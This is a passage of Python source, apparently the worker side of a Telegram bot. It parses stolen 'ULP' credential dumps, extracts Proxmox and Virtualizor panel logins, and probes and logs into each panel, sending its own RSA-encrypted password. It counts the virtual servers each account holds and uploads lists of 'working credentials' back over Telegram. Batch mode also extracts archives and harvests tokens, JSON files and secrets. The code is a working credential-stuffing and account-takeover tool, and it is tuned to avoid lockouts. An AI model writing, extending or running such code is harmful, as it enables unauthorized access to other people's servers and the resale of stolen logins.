                host, u, p = m2.group(1).strip(), m2.group(2).strip(), m2.group(3).strip()
                break
        if not host:
            parts = line.split(":")
            if len(parts) >= 4:
                p = parts[-1].strip()
                u = parts[-2].strip()
                host = ":".join(parts[:-2]).strip()
    if not host or not u or not p:
        return None
    if not host.lower().startswith(("http://", "https://")):
        host = "https://" + host
    if VIRTL_PANL not in host:
        return None
    return host, u, p


def virtl_hits(path):
    """Streamed panel scan — the file is read line by line, so a 3.9 GB dump is
    scanned with a few MB of RAM. Zip archives are unpacked and every inner file
    is scanned the same way."""
    with open(path, "rb") as fh:
        magic = fh.read(4)
    files = [str(path)]
    if magic == b"PK\x03\x04":
        exd = WORK / "virtlun"
        try:
            shutil.rmtree(exd, ignore_errors=True)
            exd.mkdir(parents=True)
            with zipfile.ZipFile(path) as z:
                z.extractall(exd)
            files = [os.path.join(root, fn)
                     for root, _d, fns in os.walk(str(exd)) for fn in sorted(fns)]
        except Exception:
            files = [str(path)]
    seen, hits = set(), []
    anchor = VIRTL_PANL.encode()
    for fp in files:
        try:
            fh = open(fp, "rb")
        except Exception:
            continue
        with fh:
            n = 0
            for raw in fh:
                n += 1
                if n % 5_000_000 == 0:
                    tick("scan", 96, msg="filtering the virtualizer lines (streamed)…",
                         scanned=n, found=len(hits))
                if anchor not in raw:
                    continue
                line = raw.decode("utf-8", "ignore")
                got = virtl_parse_line(line)
                if not got:
                    continue
                key = (got[0], got[1], got[2])
                if key in seen:
                    continue
                seen.add(key)
                hits.append(key)
    return hits


def virtl_base_url(url):
    """Strip the path from a panel URL.

    ULP dumps carry panel URLs that already point at a page
    ("https://host:4083/sessXXXX/index.php"). Appending "/index.php" to those
    yields "/index.php/index.php", which answers 404 with an HTML body and
    breaks the JSON parse. The API always lives at the root of the host."""
    try:
        parts = urlsplit(url)
        if not parts.netloc:
            return url.rstrip("/")
        return urlunsplit((parts.scheme, parts.netloc, "", "", "")).rstrip("/")
    except Exception:
        return url.rstrip("/")


def virtl_endpoint(url):
    """The JSON login endpoint for a panel."""
    return virtl_base_url(url) + "/index.php?api=json&act=login"


def _der_read(buf, pos):
    """Read one DER TLV. Returns (tag, content, next_pos)."""
    tag = buf[pos]
    pos += 1
    n = buf[pos]
    pos += 1
    if n & 0x80:
        k = n & 0x7F
        n = int.from_bytes(buf[pos:pos + k], "big")
        pos += k
    return tag, buf[pos:pos + n], pos + n


def virtl_rsa_encrypt(pubkey_pem, password):
    """Encrypt the password with the panel's RSA key, PKCS#1 v1.5.

    The runner has no crypto library, so the padding and the modular
    exponentiation are done by hand. The result is the base64 of the DER
    ciphertext, which is what the panel's own JS sends."""
    body = "".join(line.strip() for line in pubkey_pem.strip().splitlines()[1:-1])
    der = base64.b64decode(body)
    # SubjectPublicKeyInfo ::= SEQUENCE { algorithm, subjectPublicKey BIT STRING }
    _tag, spki, _ = _der_read(der, 0)
    _tag, _alg, p = _der_read(spki, 0)
    _tag, bits, _ = _der_read(spki, p)
    rsa = bits[1:]                      # drop the unused-bits byte
    # RSAPublicKey ::= SEQUENCE { modulus INTEGER, publicExponent INTEGER }
    _tag, seq, _ = _der_read(rsa, 0)
    _tag, mod_b, p = _der_read(seq, 0)
    _tag, exp_b, _ = _der_read(seq, p)

    n = int.from_bytes(mod_b, "big")
    e = int.from_bytes(exp_b, "big")
    k = (n.bit_length() + 7) // 8

    msg = password.encode("utf-8")
    if len(msg) > k - 11:
        raise ValueError("password too long for the panel key")

    ps_len = k - len(msg) - 3
    pool = bytearray()
    while len(pool) < ps_len:
        pool += bytes(b for b in os.urandom(ps_len) if b != 0)
    ps = bytes(pool[:ps_len])

    em = b"\x00\x02" + ps + b"\x00" + msg
    ct = pow(int.from_bytes(em, "big"), e, n)
    return base64.b64encode(ct.to_bytes(k, "big")).decode()


def virtl_probe(entry):
    """('ok'|'invalid'|'dead', note) — is the panel up and really Virtualizor?"""
    url, user, pwd = entry
    endpoint = virtl_endpoint(url)
    try:
        r = requests.get(endpoint, timeout=8, verify=False, allow_redirects=True,
                         headers={"User-Agent": VIRTL_UA})
    except Exception as e:
        return "dead", type(e).__name__
    if r.status_code >= 500:
        return "dead", "HTTP %s" % r.status_code
    body = (r.text or "")[:20000]
    server = (r.headers.get("Server") or "").lower()
    try:
        pk = ((r.json() or {}).get("pubkey") or "")
    except Exception:
        pk = ""
    if "virtualizor" in server or "BEGIN PUBLIC KEY" in pk:
        return "ok", "HTTP %s" % r.status_code
    low = body.lower()
    if "virtualizor" in low or "webvirt" in low:
        return "ok", "HTTP %s" % r.status_code
    return "invalid", "HTTP %s" % r.status_code


def virtl_login(entry):
    """('valid'|'bad'|'error', note, vps_count) — logs into one panel.

    The panel answers 200 with JSON for every outcome, so the success signal is
    the "redirect" field: a successful login returns the session path the
    browser should follow ("/sessXXXX/index.php?"), a rejected login returns no
    redirect at all.

    A rejected login is never retried: the panel counts every failed attempt
    against a quota and locks the account out after five."""
    url, user, pwd = entry
    endpoint = virtl_endpoint(url)
    sess = requests.Session()
    sess.verify = False
    sess.headers.update({"User-Agent": VIRTL_UA,
                         "X-Requested-With": "XMLHttpRequest"})

    note = "no attempt"
    for attempt in range(1 + VIRTL_RETRY):
        pubkey = ""
        try:
            r = sess.get(endpoint, timeout=10)
            try:
                pubkey = ((r.json() or {}).get("pubkey") or "")
            except Exception:
                pubkey = ""
        except Exception as e:
            note = "%s: %s" % (type(e).__name__, str(e)[:60])
            if attempt < VIRTL_RETRY:
                time.sleep(1)
            continue

        payload = {"username": user, "password": pwd, "login": "1"}
        if pubkey:
            try:
                payload["encrypted_password"] = virtl_rsa_encrypt(pubkey, pwd)
            except Exception as e:
                note = "encrypt: %s" % str(e)[:60]

        try:
            r = sess.post(endpoint, timeout=12, data=payload)
        except Exception as e:
            note = "%s: %s" % (type(e).__name__, str(e)[:60])
            if attempt < VIRTL_RETRY:
                time.sleep(1)
            continue
        if r.status_code >= 500:
            note = "HTTP %s" % r.status_code
            if attempt < VIRTL_RETRY:
                time.sleep(1)
            continue
        try:
            d = r.json() or {}
        except Exception:
            return "error", "unparseable response", 0

        if d.get("error"):
            err = d.get("error")
            if isinstance(err, list):
                err = "; ".join(str(x) for x in err)
            return "bad", str(err)[:80], 0

        if d.get("redirect"):
            return "valid", "", virtl_count_vps(sess, url)

        uid = str(d.get("uid") or "").strip()
        uname = str(d.get("username") or "").strip()
        if (uid.isdigit() and int(uid) > 0) or uname:
            return "valid", "", virtl_count_vps(sess, url)

        return "bad", "login rejected", 0
    return "error", note, 0


def virtl_count_vps(sess, base_url):
    """How many virtual servers the account can see.

    The panel reports the number in its "counts" object ("counts":{"vps":"1"}),
    not in a list. The value is a string on every panel that was checked."""
    endpoint = virtl_base_url(base_url) + "/index.php?api=json&act=vps"
    try:
        r = sess.get(endpoint, timeout=10)
        if r.status_code >= 500:
            return 0
        d = r.json() or {}
    except Exception:
        return 0
    counts = d.get("counts")
    if isinstance(counts, dict):
        raw = counts.get("vps")
        if isinstance(raw, dict):
            raw = raw.get("count")
        try:
            n = int(str(raw).strip())
            if n > 0:
                return n
        except Exception:
            pass
    try:
        return int(str(d.get("vps") or 0).strip())
    except Exception:
        return 0


def write_working(path, entries, kind):
    """Write the working credentials as a separate txt.

    The report keeps every outcome so nothing is lost; this file holds only
    the panels that actually accepted the login, in the same url:user:pass
    shape the scan commands produce."""
    if not entries:
        return None
    with open(path, "w", encoding="utf-8", errors="ignore") as fh:
        fh.write("=== %s — WORKING CREDENTIALS ===\n" % kind)
        fh.write("Count : %d\n" % len(entries))
        fh.write("Date  : %s\n\n" % time.strftime("%Y-%m-%d %H:%M:%S"))
        for e in entries:
            fh.write("%s:%s:%s\n" % (e[0], e[1], e[2]))
    return path


def tg_pull(fid, path):
    """Download a Telegram document with the injected BOT_TOKEN."""
    r = requests.get(TG_API + "getFile", params={"file_id": fid}, timeout=30)
    p = ((r.json() or {}).get("result") or {}).get("file_path")
    if not p:
        raise RuntimeError("tg getFile failed: %s" % (r.text or "")[:110])
    with open(path, "wb") as fh:
        fh.write(requests.get(TG_API + "file/bot%s/%s" % (TG, p), timeout=300).content)
    return path

def _vps_pct(done, total, base=2, span=96):
    return base + (done * span // total if total else 0)

def process_vps(task):
    """/vps_promox and /vps_check on this runner — one clean VM per job."""
    global CHAT
    kind = task.get("kind")
    CHAT = task.get("chat")
    PB[0], PB[2], PB[3] = 0.0, time.time(), 0
    PB[1] = task.get("msg")
    (OUT / "cancel.flag").unlink(missing_ok=True)
    st("queued", 0, job=task.get("job"), vm=SPECS)
    t0 = time.time()

    if kind == "vps_promox":
        if task.get("url"):
            arc = download(task["url"])            # /extract's own downloader
            if arc is None:
                finish(task, "error", err=_state.get("err") or "download failed")
                return
            path = str(arc)
        elif task.get("file_id"):
            path = tg_pull(task["file_id"], str(WORK / "vps_src.dat"))
        else:
            finish(task, "error", err="no source — send an ulp link or a file"); return
        st("scan", 96, msg="filtering the panel lines (streamed)…", file=Path(path).name)
        hits = vps_hits(path)
        if not hits:
            finish(task, "error", err="no panel url:user:pass lines in the source")
            return
        st("vps_probe", 2, total=len(hits), ok=0, invalid=0, dead=0)
        ok, inval, dead = [], [], []
        done = [0]
        def _probe(e):
            res = vps_probe(e)
            done[0] += 1
            (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((e, res[1]))
            tick("vps_probe", _vps_pct(done[0], len(hits)),
                 total=len(hits), ok=len(ok), invalid=len(inval), dead=len(dead),
                 threads=VPS_TUNE,
                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(hits) - done[0])),
                 elapsed=ft(time.time() - t0))
        with ThreadPoolExecutor(max_workers=VPS_TUNE) as ex:
            list(ex.map(_probe, hits))
        if stop():
            finish(task, "cancelled"); return
        rf = OUT / "vps_promox_results.txt"
        with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write("=== VPS PROMOX — SUMMARY ===\n"
                     "Extracted   : %d\n"
                     "Reachable   : %d\n"
                     "Not Proxmox : %d\n"
                     "Dead        : %d\n"
                     "Date        : %s\n\n"
                     "=== REACHABLE ===\n%s\n"
                     "=== NOT PROXMOX ===\n%s\n"
                     "=== DEAD / UNREACHABLE ===\n%s\n" % (
                         len(hits), len(ok), len(inval), len(dead),
                         time.strftime("%Y-%m-%d %H:%M:%S"),
                         "".join("%s:%s:%s\n" % e for (e, _n) in ok),
                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
                                 for (e, n) in inval),
                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
                                 for (e, n) in dead)))
        st("vps_pack", 99, total=len(hits), ok=len(ok))
        sent = upload(str(rf),
                      "VPS PROMOX — reachable %s/%s panels" % (len(ok), len(hits)))
        wf = write_working(str(OUT / "vps_promox_working.txt"),
                            [e for (e, _n) in ok], "VPS PROMOX")
        sent2 = upload(wf, "✅ VPS PROMOX — %s working panels" % len(ok)) if wf else 0
        finish(task, "done", total=len(hits), reach=len(ok),
               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
               working=len(ok))
        return

    if kind == "vps_check":
        if not task.get("file_id"):
            finish(task, "error", err="no results file — reply to one with /vps_check")
            return
        path = tg_pull(task["file_id"], str(WORK / "vps_check_src.dat"))
        entries = vps_hits(path)
        if not entries:
            finish(task, "error", err="no panel url:user:pass lines in that file")
            return
        st("vps_login", 2, total=len(entries), valid=0, bad=0, errors=0)
        valid, bad, err = [], [], []
        done = [0]
        def _check(e):
            res = vps_login(e)
            done[0] += 1
            (valid if res[0] == "valid" else bad if res[0] == "bad" else err).append((e, res[1]))
            tick("vps_login", _vps_pct(done[0], len(entries)),
                 total=len(entries), valid=len(valid), bad=len(bad), errors=len(err),
                 threads=VPS_CHECKS,
                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(entries) - done[0])),
                 elapsed=ft(time.time() - t0))
        with ThreadPoolExecutor(max_workers=VPS_CHECKS) as ex:
            list(ex.map(_check, entries))
        if stop():
            finish(task, "cancelled"); return
        rp = OUT / "vps_check_results.txt"
        rp.write_text(
            "=== VPS PROXMOX CHECK — SUMMARY ===\n"
            "Entries : %d\nValid   : %d\nBad     : %d\nErrors  : %d\n"
            "Date    : %s\n\n=== VALID OK ===\n%s\n=== BAD ===\n%s\n=== ERROR ===\n%s\n" % (
                len(entries), len(valid), len(bad), len(err),
                time.strftime("%Y-%m-%d %H:%M:%S"),
                "".join("%s:%s:%s\n" % e for (e, _n) in valid),
                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n) in bad),
                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n) in err)))
        st("vps_pack", 99, total=len(entries), valid=len(valid))
        sent = upload(str(rp),
                      "VPS CHECK — valid %s / bad %s / errors %s"
                      % (len(valid), len(bad), len(err)))
        wf = write_working(str(OUT / "vps_check_working.txt"),
                            [e for (e, _n) in valid], "VPS CHECK")
        sent2 = upload(wf, "✅ VPS CHECK — %s working panels" % len(valid)) if wf else 0
        finish(task, "done", total=len(entries), valid=len(valid),
               bad=len(bad), errors=len(err), sent=1 if sent else 0,
               working=len(valid))
        return

    if kind == "vps_virtl":
        if task.get("url"):
            arc = download(task["url"])
            if arc is None:
                finish(task, "error", err=_state.get("err") or "download failed")
                return
            path = str(arc)
        elif task.get("file_id"):
            path = tg_pull(task["file_id"], str(WORK / "virtl_src.dat"))
        else:
            finish(task, "error", err="no source — send an ulp link or a file"); return
        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
        hits = virtl_hits(path)
        if not hits:
            finish(task, "error", err="no virtualizer url:user:pass lines in the source")
            return
        st("vps_probe", 2, total=len(hits), ok=0, invalid=0, dead=0)
        ok, inval, dead = [], [], []
        done = [0]
        def _probe(e):
            res = virtl_probe(e)
            done[0] += 1
            (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((e, res[1]))
            tick("vps_probe", _vps_pct(done[0], len(hits)),
                 total=len(hits), ok=len(ok), invalid=len(inval), dead=len(dead),
                 threads=VIRTL_TUNE,
                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(hits) - done[0])),
                 elapsed=ft(time.time() - t0))
        with ThreadPoolExecutor(max_workers=VIRTL_TUNE) as ex:
            list(ex.map(_probe, hits))
        if stop():
            finish(task, "cancelled"); return
        rf = OUT / "vps_virtl_results.txt"
        with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
            fh.write("=== VPS VIRTUALIZER SCAN — SUMMARY ===\n"
                     "Extracted   : %d\n"
                     "Reachable   : %d\n"
                     "Not Virtualizor : %d\n"
                     "Dead        : %d\n"
                     "Date        : %s\n\n"
                     "=== REACHABLE ===\n%s\n"
                     "=== NOT VIRTUALIZOR ===\n%s\n"
                     "=== DEAD / UNREACHABLE ===\n%s\n" % (
                         len(hits), len(ok), len(inval), len(dead),
                         time.strftime("%Y-%m-%d %H:%M:%S"),
                         "".join("%s:%s:%s\n" % e for (e, _n) in ok),
                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
                                 for (e, n) in inval),
                         "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n)
                                 for (e, n) in dead)))
        st("vps_pack", 99, total=len(hits), ok=len(ok))
        sent = upload(str(rf),
                      "VPS VIRTUALIZER — reachable %s/%s panels" % (len(ok), len(hits)))
        wf = write_working(str(OUT / "vps_virtl_working.txt"),
                            [e for (e, _n) in ok], "VPS VIRTUALIZER")
        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(ok)) if wf else 0
        finish(task, "done", total=len(hits), reach=len(ok),
               invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
               working=len(ok))
        return

    if kind == "vps_verify":
        if task.get("url"):
            arc = download(task["url"])
            if arc is None:
                finish(task, "error", err=_state.get("err") or "download failed")
                return
            path = str(arc)
        elif task.get("file_id"):
            path = tg_pull(task["file_id"], str(WORK / "virtl_verify_src.dat"))
        else:
            finish(task, "error", err="no source — send a results link or a file"); return
        st("scan", 96, msg="filtering the virtualizer lines (streamed)…", file=Path(path).name)
        entries = virtl_hits(path)
        if not entries:
            finish(task, "error", err="no virtualizer url:user:pass lines in that file")
            return
        st("vps_login", 2, total=len(entries), valid=0, bad=0, errors=0)
        valid, bad, errl = [], [], []
        done = [0]
        def _check(e):
            res = virtl_login(e)
            done[0] += 1
            (valid if res[0] == "valid" else bad if res[0] == "bad" else errl).append((e, res[1], res[2]))
            tick("vps_login", _vps_pct(done[0], len(entries)),
                 total=len(entries), valid=len(valid), bad=len(bad), errors=len(errl),
                 threads=VIRTL_CHECKS,
                 speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
                 eta=ft((time.time() - t0) / max(1, done[0]) * (len(entries) - done[0])),
                 elapsed=ft(time.time() - t0))
        with ThreadPoolExecutor(max_workers=VIRTL_CHECKS) as ex:
            list(ex.map(_check, entries))
        if stop():
            finish(task, "cancelled"); return
        rp = OUT / "vps_verify_results.txt"
        withvps = [x for x in valid if x[2] > 0]
        rp.write_text(
            "=== VPS VIRTUALIZER VERIFY — SUMMARY ===\n"
            "Entries : %d\nValid   : %d\nValid+VPS: %d\nBad     : %d\nErrors  : %d\n"
            "Date    : %s\n\n=== VALID OK ===\n%s\n=== VALID WITH VPS (>0) ===\n%s\n"
            "=== BAD ===\n%s\n=== ERROR ===\n%s\n" % (
                len(entries), len(valid), len(withvps), len(bad), len(errl),
                time.strftime("%Y-%m-%d %H:%M:%S"),
                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in valid),
                "".join("%s:%s:%s  (vps=%d)\n" % (e[0], e[1], e[2], v) for (e, _n, v) in withvps),
                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in bad),
                "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], n) for (e, n, _v) in errl)))
        st("vps_pack", 99, total=len(entries), valid=len(valid))
        sent = upload(str(rp),
                      "VPS VIRTUALIZER VERIFY — valid %s / bad %s / errors %s"
                      % (len(valid), len(bad), len(errl)))
        wf = write_working(str(OUT / "vps_verify_working.txt"),
                            [(e[0], e[1], e[2]) for (e, _n, _v) in valid],
                            "VPS VIRTUALIZER VERIFY")
        sent2 = upload(wf, "✅ VPS VIRTUALIZER — %s working panels" % len(valid)) if wf else 0
        finish(task, "done", total=len(entries), valid=len(valid),
               bad=len(bad), errors=len(errl), sent=1 if sent else 0,
               working=len(valid))
        return

    finish(task, "error", err="unknown vps kind %r" % kind)

# ── batch mode (/batch_files): many files, one operation over all of them ───

BATCH_DL_WORKERS = 5      # files pulled at the same time
BATCH_SCAN_WORKERS = 64   # panels probed at the same time



def prefer_direct(url, fallback):
    """Return the direct origin only when it actually answers.

    Relay tasks carry a direct public-IP link plus the Cloudflare tunnel link
    as a fallback. The tunnel meters every connection and caps a transfer
    near 10 MB/s, while the direct path is limited only by the relay's own
    uplink. A dead direct origin (IP moved, port filtered) must never break a
    job, so it is probed first and the tunnel is used when the probe fails.
    """
    url = (url or "").strip()
    fallback = (fallback or "").strip()
    if not url or not fallback or fallback == url:
        return url
    # The relay's first chunk after a restart is slow: the MTProto
    # connections are cold and every session resolves the document once, so
    # one range request can take 10-20 s before the first byte arrives. A
    # short probe would reject a healthy direct origin and send the whole job
    # through the metered tunnel, so probe with patience and one retry. The
    # range is 1 KiB because the relay answers it from the same first chunk a
    # real download would fetch.
    last = ""
    for attempt in range(2):
        try:
            r = requests.get(url, headers={"Range": "bytes=0-1023",
                                           "User-Agent": "Mozilla/5.0"},
                             timeout=(10, 35), stream=True)
            ok = r.status_code in (200, 206)
            r.close()
            if ok:
                if attempt:
                    sys.stdout.write("direct origin ok on retry\n")
                return url
            last = "HTTP %s" % r.status_code
        except Exception as e:
            last = str(e)[:80]
        if attempt == 0:
            time.sleep(2)
    sys.stdout.write("direct origin failed (%s), using tunnel\n" % last)
    sys.stdout.flush()
    return fallback


def batch_download(files):
    """Download every file of the batch with BATCH_DL_WORKERS parallel threads.

    One aggregate progress line is published for the whole set: bytes pulled,
    the total size and how many files are already on disk."""
    dest = WORK / "batch"
    dest.mkdir(parents=True, exist_ok=True)
    t0 = time.time()

    total_bytes = 0
    for spec in files:
        try:
            total_bytes += int(spec.get("size") or 0)
        except Exception:
            pass

    lock = threading.Lock()
    done_bytes = [0]
    done_files = [0]
    paths = [None] * len(files)
    errors = {}
    last_file = [None]
    last_byte = [time.time()]
    stop_pub = threading.Event()
    # The rate the card shows: measured over the last couple of seconds.
    cur_rate = [0.0]

    def publisher():
        """One aggregate progress line for the whole set.

        It runs on its own thread: the Telegram call must never block a
        download thread, and the card has to move while the bytes flow --
        not only once a file is finished."""
        last_got = [0.0]
        last_at = [time.time()]
        while not stop_pub.is_set():
            with lock:
                got = done_bytes[0]
                fin = done_files[0]
                cur = last_file[0]
                idle = time.time() - last_byte[0]
            el = max(0.001, time.time() - t0)
            # The rate is measured over the last few seconds, not since the
            # start: a cumulative average starts at zero and keeps dragging
            # the reading down long after the link is running at full speed.
            now = time.time()
            rate = 0.0
            if now - last_at[0] >= 1.0:
                rate = max(0.0, (got - last_got[0]) / (now - last_at[0]))
                last_got[0] = got
                last_at[0] = now
            cur_rate[0] = rate
            note = ""
            if got == 0 and idle > 15:
                note = "no bytes yet (%.0fs) — waiting for the relay" % idle
            if total_bytes:
                pct = int(got * 68 // total_bytes)
            else:
                pct = int(fin * 68 // max(1, len(files)))
            tick("batch_download", min(pct, 68),
                 files_done=fin, files_total=len(files),
                 got=fs(got), total=fs(total_bytes) if total_bytes else "?",
                 speed=(fs(rate) + "/s") if rate > 0 else "-",
                 elapsed=ft(el),
                 file=cur or "",
                 note=note,
                 batch_files="%d/%d" % (fin, len(files)),
                 batch_total=fs(total_bytes) if total_bytes else "?")
            stop_pub.wait(2.0)

    def one(idx, spec):
        url = prefer_direct(spec.get("url"), spec.get("fallback_url"))
        if not url:
            return
        name = spec.get("name") or ""
        try:
            src, fname, fsize, err = resolve(url)
        except Exception as e:
            errors[idx] = str(e)[:90]
            return
        if err:
            errors[idx] = str(err)[:90]
            return
        if not fname:
            fname = name or ("file_%d.bin" % (idx + 1))
        if not fsize:
            try:
                fsize = int(spec.get("size") or 0)
            except Exception:
                fsize = 0
        # every file gets its own slot, so two files with the same name never
        # fight over the same path
        safe = re.sub(r"[\\/:*?\"<>|]+", "_", fname)[:80]
        out_name = "%02d_%s" % (idx + 1, safe)

        def cb(n, _i=idx):
            with lock:
                done_bytes[0] += n
                last_file[0] = out_name
                last_byte[0] = time.time()

        path = fast_parallel_dl(src, dest, out_name, fsize, t0, progress_cb=cb)
        if path and os.path.isfile(path):
            paths[idx] = path
        else:
            # The download did not complete. The file on disk has the right
            # length but holes in it, so it must not be scanned.
            try:
                (dest / out_name).unlink(missing_ok=True)
            except Exception:
                pass
            errors[idx] = "download incomplete"
        with lock:
            done_files[0] += 1
            got = done_bytes[0]
            fin = done_files[0]
            last_file[0] = out_name
        el = max(0.001, time.time() - t0)
        pct = int(got * 68 // total_bytes) if total_bytes else int(fin * 68 // max(1, len(files)))
        tick("batch_download", min(pct, 68),
             files_done=fin, files_total=len(files),
             got=fs(got), total=fs(total_bytes) if total_bytes else "?",
             speed=(fs(cur_rate[0]) + "/s") if cur_rate[0] > 0 else "-",
             elapsed=ft(el), file=out_name,
             batch_files="%d/%d" % (fin, len(files)),
             batch_total=fs(total_bytes) if total_bytes else "?")

    st("batch_download", 2, files_done=0, files_total=len(files),
       got=fs(0), total=fs(total_bytes) if total_bytes else "?",
       speed="-", elapsed="0s",
       batch_files="0/%d" % len(files),
       batch_total=fs(total_bytes) if total_bytes else "?")

    pub = threading.Thread(target=publisher, daemon=True)
    pub.start()
    try:
        with ThreadPoolExecutor(max_workers=BATCH_DL_WORKERS) as ex:
            futs = [ex.submit(one, i, spec) for i, spec in enumerate(files)]
            for f in as_completed(futs):
                try:
                    f.result()
                except Exception as e:
                    sys.stdout.write("batch download failed: %s\n" % e)
                    sys.stdout.flush()
    finally:
        stop_pub.set()
        time.sleep(0.1)
    if stop():
        return [], total_bytes, errors
    got_paths = [p for p in paths if p]
    return got_paths, total_bytes, errors


def _batch_hits(paths, virtl=False):
    """Panel lines of every file, deduplicated, with the file they came from."""
    hits, seen = [], set()
    for p in paths:
        for e in (virtl_hits(p) if virtl else vps_hits(p)):
            if e in seen:
                continue
            seen.add(e)
            hits.append((os.path.basename(p), e))
    return hits


def batch_panels(task, paths, virtl=False, total_bytes=0):
    """Scan every file for panels and probe them all — one combined report."""
    t0 = time.time()
    probe = virtl_probe if virtl else vps_probe
    label = "VPS VIRTUALIZER" if virtl else "VPS PROMOX"

    st("scan", 72, msg="filtering the panel lines (streamed)…",
       files_total=len(paths))
    found = _batch_hits(paths, virtl=virtl)
    if not found:
        finish(task, "error", err="no %s panel url:user:pass lines in the batch"
               % ("virtualizer" if virtl else "proxmox"))
        return

    st("vps_probe", 74, total=len(found), ok=0, invalid=0, dead=0)
    ok, inval, dead = [], [], []
    done = [0]

    def _probe(item):
        src_file, e = item
        res = probe(e)
        done[0] += 1
        (ok if res[0] == "ok" else inval if res[0] == "invalid" else dead).append((src_file, e, res[1]))
        tick("vps_probe", 74 + done[0] * 24 // max(1, len(found)),
             total=len(found), ok=len(ok), invalid=len(inval), dead=len(dead),
             threads=BATCH_SCAN_WORKERS,
             speed="%0.1f/s" % (done[0] / max(0.5, time.time() - t0)),
             eta=ft((time.time() - t0) / max(1, done[0]) * (len(found) - done[0])),
             elapsed=ft(time.time() - t0))

    with ThreadPoolExecutor(max_workers=BATCH_SCAN_WORKERS) as ex:
        list(ex.map(_probe, found))
    if stop():
        finish(task, "cancelled")
        return

    rf = OUT / ("%s_results.txt" % ("vps_virtl" if virtl else "vps_promox"))
    with open(rf, "w", encoding="utf-8", errors="ignore") as fh:
        fh.write("=== %s — BATCH SUMMARY ===\n"
                 "Files       : %d\n"
                 "Extracted   : %d\n"
                 "Reachable   : %d\n"
                 "Not %s : %d\n"
                 "Dead        : %d\n"
                 "Date        : %s\n\n"
                 "=== REACHABLE ===\n%s\n"
                 "=== NOT %s ===\n%s\n"
                 "=== DEAD / UNREACHABLE ===\n%s\n" % (
                     label, len(paths), len(found), len(ok),
                     "VIRTUALIZER" if virtl else "PROXMOX", len(inval), len(dead),
                     time.strftime("%Y-%m-%d %H:%M:%S"),
                     "".join("%s:%s:%s  (%s)\n" % (e[0], e[1], e[2], src) for (src, e, _n) in ok),
                     "VIRTUALIZER" if virtl else "PROXMOX",
                     "".join("%s:%s:%s  (%s)  [%s]\n" % (e[0], e[1], e[2], n, src)
                             for (src, e, n) in inval),
                     "".join("%s:%s:%s  (%s)  [%s]\n" % (e[0], e[1], e[2], n, src)
                             for (src, e, n) in dead)))

    st("vps_pack", 99, total=len(found), ok=len(ok))
    sent = upload(str(rf), "%s — reachable %s/%s panels from %s files"
                  % (label, len(ok), len(found), len(paths)))
    wf = write_working(str(OUT / ("%s_working.txt" % ("vps_virtl" if virtl else "vps_promox"))),
                       [e for (_src, e, _n) in ok], label)
    if wf:
        upload(wf, "✅ %s — %s working panels" % (label, len(ok)))
    finish(task, "done", total=len(found), reach=len(ok),
           invalid=len(inval), unreach=len(dead), sent=1 if sent else 0,
           files=len(paths), bytes=total_bytes, mode=task.get("mode"))


def batch_extract(task, paths, total_bytes=0):
    """Extract every archive of the batch, then search the whole set at once."""
    passwords = task.get("passwords") or []
    root = WORK / "bex"
    shutil.rmtree(root, ignore_errors=True)
    root.mkdir(parents=True, exist_ok=True)

    opened = 0
    for i, p in enumerate(paths):
        if stop():
            finish(task, "cancelled")
            return
        st("extract", 72 + int(i * 8 / max(1, len(paths))),
           msg="extracting %s" % os.path.basename(p),
           files_done=i, files_total=len(paths))
        ok, why = extract(p, root / ("%02d" % i), passwords)
        if ok:
            opened += 1
        else:
            sys.stdout.write("extract failed for %s: %s\n" % (p, why))
            sys.stdout.flush()
    if not opened:
        finish(task, "error", err="no archive of the batch could be extracted")
        return
    if stop():
        finish(task, "cancelled")
        return

    packed, auths = search_pack(root, bool(task.get("auth")))
    if stop():
        shutil.rmtree(WORK, ignore_errors=True)
        finish(task, "cancelled")
        return
    sent, failed, links = deliver(packed, task)

    tok_zip, tok_total = None, 0
    toks = find_tokens([root])
    if toks:
        tok_zip, tok_total = pack_tokens(toks)
    tok_parts, tok_link = 0, None
    if tok_zip:
        def tok_cap(size, idx, count, tot, split):
            return (f"{gold_header('TOKEN FILES', esc('%d found' % tok_total))}\n{THIN}\n"
                    f"🎟 {bold('Files')}    {code(tok_total)} × {code('tokens.txt')}\n"
                    + ship_note(idx, count, size, tot, split, "tokens.zip"))
        tok_parts, tok_link = ship(tok_zip, tok_cap)
        if tok_link:
            links["tokens"] = tok_link

    js_zip, js_total = None, 0
    if task.get("json"):
        jsf = find_json([root])
        if jsf:
            js_zip, js_total = pack_json(jsf)
    js_parts, js_link = 0, None
    if js_zip:
        def js_cap(size, idx, count, tot, split):
            return (f"{gold_header('JSON FILES', esc('%d found' % js_total))}\n{THIN}\n"
                    f"🗂 {bold('Files')}    {code(js_total)} × {code('.json')}\n"
                    + ship_note(idx, count, size, tot, split, "json_files.zip"))
        js_parts, js_link = ship(js_zip, js_cap)
        if js_link:
            links["json"] = js_link

    sec_zip, sec_total = None, 0
    secf = find_secrets([root])
    if secf:
        sec_zip, sec_total = pack_secrets(secf)
    sec_parts, sec_link = 0, None
    if sec_zip:
        def sec_cap(size, idx, count, tot, split):
